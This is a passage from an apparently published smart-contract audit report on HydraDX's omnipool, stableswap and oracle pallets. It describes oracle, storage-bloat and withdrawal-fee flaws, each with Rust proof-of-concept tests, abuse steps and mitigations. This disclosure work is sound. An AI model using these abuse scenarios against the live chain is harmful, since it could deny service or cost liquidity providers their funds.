> 1. The `asset_a` got added by calling the `add_token` function this function mint the `shares` of the initial liquidity to the `position_owner` as shown [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/omnipool/src/lib.rs#L487-L496).
> 2. The `position_owner` removed all his liquidity from the pool and burnt his all shares by calling the function `remove_liquidity` [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/omnipool/src/lib.rs#L716-L720), passing the amount of `shares` minted to him as the `amount` to this function and removed all the liquidity from the pool. 
> 3. After the entire liquidity removal, all liquidity providers will be prevented from adding liquidity to the `asset_a` pool, due to the fact that the reserve of the `asset_a` of the pool now is equal to zero as I tested in my coded POC. The function `add_liquidity` will always revert due to division by zero error, because the division performed, as shown here:
>
> ```rust 
>         let delta_shares_hp = shares_hp
>                 .checked_mul(amount_hp)
>                 .and_then(|v| v.checked_div(reserve_hp))?;
> ```
>
> ### Lock of funds risk if someone sends some amount of asset to the pool after the entire liquidity has been removed. 
>  As mentioned, there is also another DoS and lock of funds of the liquidity providers, if the entire liquidity removal of `asset_a` happens and then any user send some amount of `asset_a` to the pool, this will allow the execution of the function `add_liquidity`, but it will returns zero amount of `shares` to the LP, so it will cause lock of funds for the liquidity provider forever. 
> 
> The impact I mentioned in the report clearly demonstrates the impact on both the protocol and the users. The first two impacts clearly emphasize the DoS that will occur and the third describes the financial losses of the protocol.
> 
> **Therefore, this finding suffices medium, as per the severity guidelines Med requires "Assets not at direct risk, but the function of the protocol or its availability could be impacted".**
> 
> When writing the proof-of-concept which submitted during the audit, I focused on demonstrating how this edge case can occur. This provides the sponsor with a clear explanation of how to mitigate this issue and pinpoint the location of the error. Therefore, the PoC includes an `assert_noop` statement to ensure that calling the `add_liquidity()` function after the entire liquidity has been removed from the pool, it will revert with the error `ArithmeticError::Overflow`, which indicates an error in the function `calculate_add_liquidity_state_changes`.
>
> Due to this, the function `add_liquidity` will always revert, meaning the pool will always be empty, so **the trading will also got disabled forever, which is considered a DoS attack.**

## [[M-07] Re-adding assets to the omnipool can cause a problem with the oracle](https://github.com/code-423n4/2024-02-hydradx-findings/issues/73)

### Impact

If an asset is removed from the omnipool, it is ensured that all data records in the omnipool are deleted and also all positions from liquidity providers. However, the data records in the Oracle are not reset. This means that if the asset is to be added again after some time and it then has a different price, the price in the Oracle is falsified.

### POC

Here is a PoC which can be inserted into the file `integration-tests/src/omnipool_init.rs`, which can be started with the following command: `SKIP_WASM_BUILD=1 cargo test -p runtime-integration-tests poc -- --nocapture`

```rust
#[test]
pub fn poc() {
	TestNet::reset();

	Hydra::execute_with(|| {
		let omnipool_account = hydradx_runtime::Omnipool::protocol_account();

		init_omnipool();

		let position_id_init = hydradx_runtime::Omnipool::next_position_id();
		assert_ok!(hydradx_runtime::Omnipool::add_token( //DOT token is added for the first time
			hydradx_runtime::RuntimeOrigin::root(),
			DOT,
			FixedU128::from_float(1.0),
			Permill::from_percent(100),
			AccountId::from(ALICE)
		));
		hydradx_run_to_next_block();

		assert_ok!(hydradx_runtime::Omnipool::sacrifice_position( //The shares from the initial liquidity are assigned to the protocol so that the token can be removed
			hydradx_runtime::RuntimeOrigin::signed(ALICE.into()),
			position_id_init
		));
		hydradx_run_to_next_block();

		assert_ok!(hydradx_runtime::Omnipool::set_asset_tradable_state( //The asset is frozen so that the token can be removed
			hydradx_runtime::RuntimeOrigin::root(),
			DOT,
			Tradability::FROZEN
		));

		assert_ok!(hydradx_runtime::Omnipool::remove_token( //This removes the token
			hydradx_runtime::RuntimeOrigin::root(),
			DOT,
			AccountId::from(ALICE)
		));

		//This is simply to skip a few blocks to show that some time has passed since the token was removed and the prices are still there

		hydradx_run_to_next_block();

		hydradx_run_to_next_block();
		hydradx_run_to_next_block();

		assert_ok!(hydradx_runtime::Tokens::transfer( //The initial liquidity is sent to the pool to add DOT the second time
			hydradx_runtime::RuntimeOrigin::signed(ALICE.into()),
			omnipool_account,
			DOT,
			500 * UNITS
		));

		assert_ok!(hydradx_runtime::Omnipool::add_token( //DOT is added the second time
			hydradx_runtime::RuntimeOrigin::root(),
			DOT,
			FixedU128::from_float(10.0), //The price has increased from 1.0 to 10.0
			Permill::from_percent(100),
			AccountId::from(ALICE)
		));
		hydradx_run_to_next_block();

		let return_value = hydradx_runtime::Omnipool::add_liquidity( //A liquidity provider tries to add liquidity
			hydradx_runtime::RuntimeOrigin::signed(ALICE.into()),
			DOT,
			1 * UNITS
		);
		println!("return_value: {:?}", return_value); //shows that adding liquidity didn't work because the price difference was too big
		hydradx_run_to_next_block();

		let (price_short, _) = hydradx_runtime::EmaOracle::get_price(LRNA, DOT, OraclePeriod::Short, OMNIPOOL_SOURCE).unwrap();
		println!("price_short: {:?}", price_short); //shows that the price for the period short is not 10, which it should actually be since the liquidity has not changed since DOT was added for the second time
	});
}
```

### Description

If an asset is removed from the Omnipool, all of its data will be deleted from the Omnipool. However, the data from the asset remains in the Oracle and is not deleted there. The Oracle then continues to store the data of the removed asset in this StorageMap:

```rust
pub type Oracles<T: Config> = StorageNMap<
                _,
                (
                        NMapKey<Twox64Concat, Source>,
                        NMapKey<Twox64Concat, (AssetId, AssetId)>,
                        NMapKey<Twox64Concat, OraclePeriod>,
                ),
                (OracleEntry<BlockNumberFor<T>>, BlockNumberFor<T>),
                OptionQuery,
        >;
```

[See `ema-oracle/src/lib.rs#L153-L162`](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/ema-oracle/src/lib.rs#L153C1-L162C4).

The price is stored here once for the last block and once with the exponential moving average logic for a few blocks in the past. (This is the short period)

The problem now is when an asset is added again and its price has changed. As a result, the new price is calculated using the exponential moving average logic with the entries of the blocks before the asset was removed and the new entries that have been added since the asset was re-added, which leads to an incorrect price. The wrong price can also cause ensure_price in add_liquidity to fail and therefore no liquidity can be added:

```rust
T::PriceBarrier::ensure_price(
			&who,
      T::HubAssetId::get(),
		  asset,
	    EmaPrice::new(asset_state.hub_reserve, asset_state.reserve),
)
.map_err(|_| Error::<T>::PriceDifferenceTooHigh)?;
```

[See `omnipool/src/lib.rs#L597-L603`](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/omnipool/src/lib.rs#L597C1-L603C54).

Any protocol that uses this oracle as a price source would receive an incorrect price for the re-added asset for a short period of time.

### Recommendation

Even if the price balances out again after some time (the length of the short period), an incorrect price is initially calculated after re-adding an asset for which the price has changed. I would recommend deleting the Oracle entries when removing an asset. This means that the price of the asset can be calculated correctly from the start when it is added again.

## [[M-08] Storage can be bloated with low value liquidity positions](https://github.com/code-423n4/2024-02-hydradx-findings/issues/54)
*Submitted by [J4X](https://github.com/code-423n4/2024-02-hydradx-findings/issues/54)*

When using the substrate framework, it is one of the main goals of developers to prevent storage bloat. If storage can easily be bloated by users, this can lead to high costs for the maintainers of the chain and a potential DOS. A more in detail explanation can be found [here](https://docs.substrate.io/build/troubleshoot-your-code/#common-substrate-issues).

The Omnipool allows users to deposit liquidity to earn fees on swaps. Whenever a user deposits liquidity through `add_liquidity()`, he gets an NFT minted and the details of his deposit are stored in the `Positions` map:

```rust
let instance_id = Self::create_and_mint_position_instance(&position_owner)?;

<Positions<T>>::insert(instance_id, lp_position);
```

To ensure that this storage is only used for serious deposits, it is ensured to be above `MinimumPoolLiquidity` which is `1,000,000` tokens in the runtime configuration.

```rust
ensure!(
	amount >= T::MinimumPoolLiquidity::get() && amount > 0,
	Error::<T>::MissingBalance
);
```

Additionally, whenever a deposit gets fully withdrawn, the storage entry is removed:

```rust
if updated_position.shares == Balance::zero() {
	// All liquidity removed, remove position and burn NFT instance

	<Positions<T>>::remove(position_id);
	T::NFTHandler::burn(&T::NFTCollectionId::get(), &position_id, Some(&who))?;

	Self::deposit_event(Event::PositionDestroyed {
		position_id,
		owner: who.clone(),
	});
}
```

Unfortunately, this implementation does not take into account that a malicious user can add `MinimumPoolLiquidity` tokens, and then instantly withdraw all but 1. In that case, he has incurred almost no cost for bloating the storage (besides the 1 token and gas fees) and can keep on doing this countless times.

### Impact

The issue allows a malicious attacker to bloat the storage in a cheap way. If done often enough this allows him to DOS the functionality of the HydraDX protocol by bloating the storage significantly until it can't be maintained anymore. If the attacker uses a very low-value token, he only incurs the gas fee for each new entry.

If we consider that the intended cost for adding a new position entry (to potentially DOS) as defined by the `MinimumPoolLiquidity` should be `1_000_000` tokens, this issue allows an attacker to get the same storage bloat for `1/1_000_000` or 0.0001% of the intended cost.

### Proof of Concept

The following testcase showcases the issue:

```rust
#[test]
fn remove_liquidity_but_one() {
	ExtBuilder::default()
		.with_endowed_accounts(vec![
			(Omnipool::protocol_account(), DAI, 1000 * ONE),
			(Omnipool::protocol_account(), HDX, NATIVE_AMOUNT),
			(LP2, 1_000, 2000 * ONE),
			(LP1, 1_000, 5000 * ONE),
		])
		.with_initial_pool(FixedU128::from_float(0.5), FixedU128::from(1))
		.with_token(1_000, FixedU128::from_float(0.65), LP2, 2000 * ONE)
		.build()
		.execute_with(|| {

			let liq_added = 1_000_000; //Exactly MinimumPoolLiquidity
			let current_position_id = <NextPositionId<Test>>::get();

			assert_ok!(Omnipool::add_liquidity(RuntimeOrigin::signed(LP1), 1_000, liq_added));

			let liq_removed = 200 * ONE;
			assert_ok!(Omnipool::remove_liquidity(
				RuntimeOrigin::signed(LP1),
				current_position_id,
				1_000_000-1 //Remove all but one asset
			));

			let position = Positions::<Test>::get(current_position_id).unwrap();
			let expected = Position::<Balance, AssetId> {
				asset_id: 1_000,
				amount: 1,
				shares: 1,
				price: (1300000000650000, 2000000001000000),
			};

			//There now is a position with 1 single Wei bloating the storage
			assert_eq!(position, expected);
		});
}
```

The testcase can be added to the `pallets/omnipool/src/tests/remove_liquidity.rs` file.

### Recommended Mitigation Steps

The issue can be mitigated by not letting the amount in an open position fall below `MinimumPoolLiquidity`. This can be enforced as follows in the `remove_liquidity()` function:

```solidity
ensure!(
	updated_position.amount >= T::MinimumPoolLiquidity::get() || updated_position.amount == 0,
	Error::<T>::InsufficientLiquidity
);
```

This storage cost should only be incurred by the protocol for serious positions, which is why they have set a minimum of 1 million tokens.  From positions of that size, they can recoup their storage cost through other fees. As one can see in the issue this can be circumvented and the protocol will not be able to recoup the storage costs through fees on dust positions leading to a potential DOS. This can happen if the storage is flooded with dust positions, leading to massive storage costs that the protocol can not recoup through fees due to the insufficient size of each position.

## [[M-09] Missing hook call will lead to incorrect oracle results](https://github.com/code-423n4/2024-02-hydradx-findings/issues/51)
*Submitted by [J4X](https://github.com/code-423n4/2024-02-hydradx-findings/issues/51), also found by [tsvetanovv](https://github.com/code-423n4/2024-02-hydradx-findings/issues/141)*

The HydraDx protocol includes an oracle. This oracle generates prices, based upon the information it receives from its sources (of which Omnipool is one). The Omnipool provides information to the oracle through the `on_liquidity_changed` and `on_trade` hooks. Whenever a trade happens or the liquidity in one of the pools changes the corresponding hooks need to be called with the updated values.

The Omnipool contract also includes the `remove_token()` function. This function can only be called by the authority and can be only called on an asset which is FROZEN and where all the liquidity shares are owned by the protocol.

```rust
ensure!(asset_state.tradable == Tradability::FROZEN, Error::<T>::AssetNotFrozen);
ensure!(
	asset_state.shares == asset_state.protocol_shares,
	Error::<T>::SharesRemaining
);
```

When the function gets called it transfers all remaining liquidity to the beneficiary and removes the token. This is a change in liquidity in the Omnipool. The functionality in terms of liquidity change is similar to the `withdraw_protocol_liquidity()` where the protocol also withdraws liquidity in the form of `protocol_shares` from the pool. When looking at the `withdraw_protocol_liquidity()` function, one can see that it calls the `on_liquidity_changed` hook at the end, so that the oracle receives the information about the liquidity change.

```rust
T::OmnipoolHooks::on_liquidity_changed(origin, info)?;
```

Unfortunately, the  `remove_token()` function does not call this hook, keeping the oracle in an outdated state. As the token is removed later on, the oracle will calculate based on liquidity that does not exist anymore in the Omnipool.

### Impact

The issue results in the oracle receiving incorrect information and calculating new prices, based on an outdated state of the Omnipool.

### Proof of Concept

The issue can be viewed when looking at the code of `remove_token()` where one can see that no call to the hook happens:

```rust
#[pallet::call_index(12)]
#[pallet::weight(<T as Config>::WeightInfo::remove_token())]
#[transactional]
pub fn remove_token(origin: OriginFor<T>, asset_id: T::AssetId, beneficiary: T::AccountId) -> DispatchResult {
	T::AuthorityOrigin::ensure_origin(origin)?;
	let asset_state = Self::load_asset_state(asset_id)?;

	// Allow only if no shares are owned by LPs and the asset is frozen.
	ensure!(asset_state.tradable == Tradability::FROZEN, Error::<T>::AssetNotFrozen);
	ensure!(
		asset_state.shares == asset_state.protocol_shares,
		Error::<T>::SharesRemaining
	);
	// Imbalance update
	let imbalance = <HubAssetImbalance<T>>::get();
	let hub_asset_liquidity = Self::get_hub_asset_balance_of_protocol_account();
	let delta_imbalance = hydra_dx_math::omnipool::calculate_delta_imbalance(
		asset_state.hub_reserve,
		I129 {
			value: imbalance.value,
			negative: imbalance.negative,
		},
		hub_asset_liquidity,
	)
	.ok_or(ArithmeticError::Overflow)?;
	Self::update_imbalance(BalanceUpdate::Increase(delta_imbalance))?;

	T::Currency::withdraw(T::HubAssetId::get(), &Self::protocol_account(), asset_state.hub_reserve)?;
	T::Currency::transfer(asset_id, &Self::protocol_account(), &beneficiary, asset_state.reserve)?;
	<Assets<T>>::remove(asset_id);
	Self::deposit_event(Event::TokenRemoved {
		asset_id,
		amount: asset_state.reserve,
		hub_withdrawn: asset_state.hub_reserve,
	});
	Ok(())
}
```

### Recommended Mitigation Steps

The issue can be mitigated by forwarding the updated asset state to the oracle by calling the `on_liquidity_changed` hook.

Issue #141 describes that in the functions `sacrifice_position()` and `remove_token()`, a hook call to `on_liquidity_changed` is missing. The sponsor has disputed this with the claim that in none of those functions, the liquidity gets changed, which is true for `sacrifice_position()` but not for `remove_token()`. In `sacrifice_position()`, the sacrificed positions' ownership is transferred to the protocol but the liquidity does not change. 
> 
> The same is not the case for the `remove_token()` function. As one can see in the following [code snippet](https://github.com/code-423n4/2024-02-hydradx/blob/main/HydraDX-node/pallets/omnipool/src/lib.rs#L1566), the function transfers out all liquidity that is owned by protocol shares to a beneficiary, changing the liquidity in the pool:

> 
> So contrary to the comment of the sponsor, not only does the token get removed but also the liquidity changes, as the protocol-owned liquidity is sent to the beneficiary. This should result in a call to the hook so that the circuit breaker and the oracle get accordingly updated (and trigger at the right values). This could for example lead to an issue if we have a maximum liquidity change per block of 100 tokens chosen in our circuit breaker and a token gets removed with 90 tokens of protocol liquidity being withdrawn. A later call withdrawing 20 liquidity would incorrectly pass as the earlier withdrawn liquidity is not accounted for due to the missing hook call. This would undermine the security measure of the circuit breaker as the limits are not correctly enforced. Additionally, due to the missing liquidity update, the oracle will be outdated too.
> 
> I would like to mention that my issue is the only issue that fully and correctly documents the problem, as Issue #141 is reporting an invalid additional issue and also recommends an incorrect mitigation of increasing the liquidityInBlock in `sacrifice_position()`.

### Impact

This vulnerability will lead to huge loss of funds for liquidity providers that want to withdraw their liquidity if the safe withdrawal is enabled. The loss of funds can be 100% of the liquidity provider's shares.

### Proof of Concept

**Normal Scenario of manipulating price and disabling removing or adding liquidity:**

If the price of certain asset got manipulated, there is an ensure function exist in the `remove_liquidity()` and `add_liquidity()`, so the function should revert in case of the price of an asset got manipulated.

```rust
                        T::PriceBarrier::ensure_price(
                                &who,
                                T::HubAssetId::get(),
                                asset,
                                EmaPrice::new(asset_state.hub_reserve, asset_state.reserve),
                        )
                        .map_err(|_| Error::<T>::PriceDifferenceTooHigh)?;
```

This `ensure_price()` function checks that the difference between spot price and oracle price is not too high, so it has critical role to prevent the profitability from this manipulation.

There is also another security parameter which is the Tradability state which can prevent removing or adding liquidity. There is also `withdrawal_fee`, which is used to make manipulating price not profitable, and it can prevent the attacker from getting any of assets if the price difference is too high.

**Important assumption:**

The assumption is that the withdrawal can be done safely without checking the price difference because the swapping of this asset got disabled so the price is stable, as shown [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/omnipool/src/lib.rs#L743).

```rust
                        let safe_withdrawal = asset_state.tradable.is_safe_withdrawal();

        pub(crate) fn is_safe_withdrawal(&self) -> bool {
                *self == Tradability::ADD_LIQUIDITY | Tradability::REMOVE_LIQUIDITY || *self == Tradability::REMOVE_LIQUIDITY
        }
}
```

**Edge case:**

Due to the fact that there is not limitation on setting tradability states to any asset except the `hub_asset`, the tradability state can be set to prevent swapping on asset at manipulated price, by making the tradability state only contain `remove` and `add` liquidity flags, when the difference between spot price and the oracle price is too high.

In such cases, the `remove_liquidity()` function will not revert with price error because the function `ensure-price()` will not work, but it will pass and the `withdrawal_fee` will be equal to 1. So 100% of the liquidity to be removed will be taken from the user as fees and will be distributed on the other liquidity providers.

**How this vulnerability can be applied:**

1. The price of asset got manipulated and the difference between spot and oracle price is too high.
2. The tradability state of the asset has been set to `remove` and `add` liquidity only (`buying` and `selling` are disabled).
3. Any user trying to remove his liquidity will be taken as fees and there is no asset will be transferred to the user and the transaction will not revert, since there is no slippage (safety) parameter that can be set by the user to ensure that amount comes from this transaction is equal to what is expected.

The normal scenario here is that the `remove_liquidity` function should revert instead of taking all user assets as `withdrawal_fee`.

The code that calculates the withdrawal fee is:

```rust
pub fn calculate_withdrawal_fee(
        spot_price: FixedU128,
        oracle_price: FixedU128,
        min_withdrawal_fee: Permill,
) -> FixedU128 {
        let price_diff = if oracle_price <= spot_price {
                spot_price.saturating_sub(oracle_price)
        } else {
                oracle_price.saturating_sub(spot_price)
        };


        let min_fee: FixedU128 = min_withdrawal_fee.into();
        debug_assert!(min_fee <= FixedU128::one());


        if oracle_price.is_zero() {
                return min_fee;
        }

        // fee can be set to 100% 
  ->    price_diff.div(oracle_price).clamp(min_fee, FixedU128::one())
}
```

The delta assets that send to the user will be zero in case that `withdrawal_fee` is 1.

```rust
        // fee_complement = 0 ; 
        let fee_complement = FixedU128::one().saturating_sub(withdrawal_fee);


        // Apply withdrawal fee
        let delta_reserve = fee_complement.checked_mul_int(delta_reserve)?;
        let delta_hub_reserve = fee_complement.checked_mul_int(delta_hub_reserve)?;
        let hub_transferred = fee_complement.checked_mul_int(hub_transferred)?;


        let delta_imbalance = calculate_delta_imbalance(delta_hub_reserve, imbalance, total_hub_reserve)?; 
```

### Tools Used

VS Code

### Recommended Mitigation Steps

This vulnerability can be mitigated by only one step:

Check that the price is in the allowed `Range` before disabling the swapping and allow `remove` and `add` liquidity on any asset. This mitigation will make sure that the `safe_withdrawal` is set to true, except if the price in the `Range` so the price is actually stable and safe to withdraw liquidity on this price.

<https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/omnipool/src/lib.rs#L1330-L1361>

Consider modifying `set_asset_tradable_state()` function to ensure that if the state is set to preventing swapping, then ensure the price:

```rust
                pub fn set_asset_tradable_state(
                        origin: OriginFor<T>,
                        asset_id: T::AssetId,
                        state: Tradability,
                ) -> DispatchResult {
                        T::TechnicalOrigin::ensure_origin(origin)?;


                        if asset_id == T::HubAssetId::get() {
                                // At the moment, omnipool does not allow adding/removing liquidity of hub asset.
                                // Although BUY is not supported yet, we can allow the new state to be set to SELL/BUY.
                                ensure!(
                                        !state.contains(Tradability::ADD_LIQUIDITY) && !state.contains(Tradability::REMOVE_LIQUIDITY),
                                        Error::<T>::InvalidHubAssetTradableState
                                );


                                HubAssetTradability::<T>::mutate(|value| -> DispatchResult {
                                        *value = state;
                                        Self::deposit_event(Event::TradableStateUpdated { asset_id, state });
                                        Ok(())
                                })
                        } else {

                                Assets::<T>::try_mutate(asset_id, |maybe_asset| -> DispatchResult {
                                        let asset_state = maybe_asset.as_mut().ok_or(Error::<T>::AssetNotFound)?;
+ if (state == Tradability::ADD_LIQUIDITY | Tradability::REMOVE_LIQUIDITY || state == Tradability::REMOVE_LIQUIDITY){
+
+      T::PriceBarrier::ensure_price(
+					&who,
+					T::HubAssetId::get(),
+					asset_id,
+					EmaPrice::new(asset_state.hub_reserve, asset_state.reserve),
+				)
+				.map_err(|_| Error::<T>::PriceDifferenceTooHigh)?;}

                                        asset_state.tradable = state;
                                        Self::deposit_event(Event::TradableStateUpdated { asset_id, state });


                                        Ok(())
                                })
                        }
                }
```

## Stapleswap

### 1. Liquidity providers can not provide the amount of assets that will result in shares more than the total issuance by calling `add_liquidity_shares` function, which is considered loss of value for the protocol

Affected code [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/math/src/stableswap/math.rs#L317-L337).

The function `add_liquidity_shares` uses the function `calculate_add_one_asset` [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/math/src/stableswap/math.rs#L317), which has a constrain that ensures that the shares specified by the user to be minted are not greater than the total issuance. There is nothing should prevent the liquidity providers from providing such amount of asset, and this amount of shares to be minted is not prevented by the function `add_liquidity` so such a constrain should be removed.

```rust 
        if shares > share_asset_issuance {
                return None;
        }
```

**Coded PoC**

Consider add this test to the test file `add_liquidity.rs`:

```rust 
#[test]
fn add_liquidity_should_work_correctly_when_fee_is_applied_test() {
	let asset_a: AssetId = 1;
	let asset_b: AssetId = 2;
	let asset_c: AssetId = 3;
	ExtBuilder::default()
		.with_endowed_accounts(vec![
			(BOB, asset_a, 200_000_000_000_000_000_000),
			(ALICE, asset_a, 52425995641788588073263117),
			(ALICE, asset_b, 52033213790329),
			(ALICE, asset_c, 119135337044269),
		])
		.with_registered_asset("one".as_bytes().to_vec(), asset_a, 18)
		.with_registered_asset("two".as_bytes().to_vec(), asset_b, 6)
		.with_registered_asset("three".as_bytes().to_vec(), asset_c, 6)
		.with_pool(
			ALICE,
			PoolInfo::<AssetId, u64> {
				assets: vec![asset_a, asset_b, asset_c].try_into().unwrap(),
				initial_amplification: NonZeroU16::new(2000).unwrap(),
				final_amplification: NonZeroU16::new(2000).unwrap(),
				initial_block: 0,
				final_block: 0,
				fee: Permill::from_float(0.0001),
			},
			InitialLiquidity {
				account: ALICE,
				assets: vec![
					AssetAmount::new(asset_a, 5_641_788_588_073_263_117),
					AssetAmount::new(asset_b, 52033213790329),
					AssetAmount::new(asset_c, 119135337044269),
				],
			},
		)
		.build()
		.execute_with(|| {
			let pool_id = get_pool_id_at(0);
			// let amount = 2_000_000_000_000_000_000;
			let total_shares = Tokens::total_issuance(pool_id); 
			assert_ok!(Stableswap::add_liquidity_shares(
				RuntimeOrigin::signed(BOB),
				pool_id,
				total_shares + 1, 
				asset_a, 
				200_000_000_000_000_000_000
			));
			let received = Tokens::free_balance(pool_id, &BOB);
			println!("shares received after providing 2_000_000_000_000_000_000 asset and call add_liquidity function: {:?}", received);
			let bob_balance = Tokens::free_balance(asset_a, &BOB);
			let used = 200_000_000_000_000_000_000 - bob_balance ; 
			println!("used: {:?}", used);
		});
// 108_887_514_683_615_710_558 assets should be taken from the user but the function call will revert due to that the shares requested are more than the total issuance 
}
```

This test should revert due to the shares requested is greater than the total issuance by 1. To make this test work, you can simply remove this one here:

```diff 
+       total_shares,
-				total_shares + 1, 
```

**Recommendation**

Consider removing this constrain:

```diff
-        if shares > share_asset_issuance {
-                return None;
-        }
```

### 2. Huge loss of funds for the users and the protocol, if the pool is created with share_asset that does have a different decimals from 18 decimals 

Affected code [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/stableswap/src/lib.rs#L341-L369) and [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/stableswap/src/lib.rs#L950-L992).

The implementation of stableswap assumes that all the shares assets have 18 decimals only but there is no check for this in the function `create_pool`, which can allow set the `share_asset` to have any number of decimals. This will affect the whole pool since the normalization function scale all the reserves to 18 decimals in order to calculate D and Y parameters. 

**Impact**

This will lead to huge loss of funds for the user and the protocol because of the wrong calculation of Y and D parameters.

**Recommendation**

Consider adding a check to ensure that the `share_asset` decimals are equal to 18 decimals. Add this check to the `do_create_pool` function:

```diff 
+                ensure!(
+                        T::AssetInspection::decimals(share_asset)== 18,
+                        Error::<T>::Invalid_decimals
+                );
```

## Omnipool

### 1. The `add_token()` function lacks a check to prevent exceeding the maximum weight cap which  will disable liquidity provision

Affected code [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/omnipool/src/lib.rs#L447-L549). 

Each token is assigned a maximum weight cap, specifying the maximum amount of hub asset that can be minted in its corresponding pool. If the quantity of hub asset paired (minted) with the added token surpasses its permitted weight capacity, liquidity provision will be frozen. This is because the `add_liquidity` function, [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/omnipool/src/lib.rs#L636-L639), incorporates a capacity constraint and exceeding this limit triggers the freezing of liquidity provision.

**Recommendation** 

Check the cap of the asset in the function `add_token()`:

```diff
                pub fn add_token(
                        origin: OriginFor<T>,
                        asset: T::AssetId,
                        initial_price: Price,
                        weight_cap: Permill,
                        position_owner: T::AccountId,
                ) -> DispatchResult {

                        ensure!(
                                hub_reserve_ratio <= new_asset_state.weight_cap(),
                                Error::<T>::AssetWeightCapExceeded
                        );
```  

### 2. Customizing the minimum trading limit on a per-asset basis is essential to facilitate liquidity provision for assets characterized by lower decimal precision and higher market prices

Affected code [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/omnipool/src/lib.rs#L577-L584). 

Tokens like [Gemini USD](https://etherscan.io/token/0x056Fd409E1d7A124BD7017459dFEa2F387b6d5Cd?a=0x5f65f7b609678448494De4C87521CdF6cEf1e932) possess just 2 decimals, while others like USDC has 6 decimals. Within the `add_liquidity` function, it is crucial to align the `MinimumPoolLiquidity` with the amount of `hub_asset`. Failure to consider this alignment, particularly when the specified amount surpasses the `maxWeightCap` established for the asset, can result in the disabling of liquidity provision for that specific token.

To illustrate, let's take a low-decimal asset with 2 decimals and set its `MinimumPoolLiquidity` at `10,000`, equating to 100 units of that asset. If this quantity of tokens corresponds to an amount of hub assets exceeding the weight cap assigned to the asset. If the max weight cap for this asset is 20% of a total hub reserve is `100,000`, then the max amount of hub allowed to be added equal to `25,000` and if the corresponding hub asset for the 100 units of asset equal to `30,000`, liquidity provision for this asset becomes disabled. This underscores the necessity for a nuanced approach in determining the minimum trading limit, ensuring the smooth provision of liquidity for assets with lower decimal precision and elevated market values, whether with 2 or 6 decimals. 

**Recommendation**

Create a map type to store the `minimumPoolLiquidty` of each Pool, or can store this minimum limit in the asset registry. This will allow specify a suitable minimum limit to each asset in the omnipool. 

### 3. The getter function can be used instead of repeating code to get the `hub_asset_liquidity`, to increase code simplicity 

Affected code [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/omnipool/src/lib.rs#L1946-L1948) and [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/omnipool/src/lib.rs#L509).
   
The `get_hub_asset_balance_of_protocol_account()` function can be used instead of getting the balance of the protocol in each function like this:

```diff 
-                    let current_hub_asset_liquidity = T::Currency::free_balance(T::HubAssetId::get(), &Self::protocol_account());
+                          let hub_asset_liquidity = Self::get_hub_asset_balance_of_protocol_account();
```

### 4. Should add `require_transactional` macro for the function that should perform storage update to make sure that storage mutated successfully

Affected code [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/omnipool/src/lib.rs#L1698-L1705).

As per the frame docs [here](https://paritytech.github.io/polkadot-sdk/master/frame_support/attr.require_transactional.html), the `require_transactional` macro should be used if the function is executed within storage transaction.  

The function `sell_hub_asset` should have `require_transactional` macro to make sure that storage update is done correctly; otherwise, this can allow execution without send the assets to the protocol and to the user, which is considered loss of funds for the user and the protocol. 
 
**Recommendation**

Add the `[require_transactional]` macro and consider adding this line to the function `sell_hub_asset`:

```diff 
+       #[require_transactional]
        fn sell_hub_asset(
                origin: T::RuntimeOrigin,
                who: &T::AccountId,
                asset_out: T::AssetId,
                amount: Balance,
                limit: Balance,
        ) -> DispatchResult {
```

## EMA Oracle

### 1. Prevent calling the funtcions `on_trade` and `on_liquidity_changed` with `asset_in = asset_out`, to prevent storing invalid prices

Affected code [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/ema-oracle/src/lib.rs#L386-L417) and [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/ema-oracle/src/lib.rs#L428-L456).

The functions `on_trade` and `on_liquidity_changed` do not check if the `asset_in` equal `asset_out` or not, so this will allow storing invalid prices in the oracle. 

The function `buy` on stableswap pallet does not prevent that `asset_in` to be equal to `asset_out`, as shown [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/stableswap/src/lib.rs#L787-L807):

```rust 
                pub fn buy(
                        origin: OriginFor<T>,
                        pool_id: T::AssetId,
                        asset_out: T::AssetId,
                        asset_in: T::AssetId,
                        amount_out: Balance,
                        max_sell_amount: Balance,
                ) -> DispatchResult {
                        let who = ensure_signed(origin)?;


                        ensure!(
                                Self::is_asset_allowed(pool_id, asset_in, Tradability::SELL)
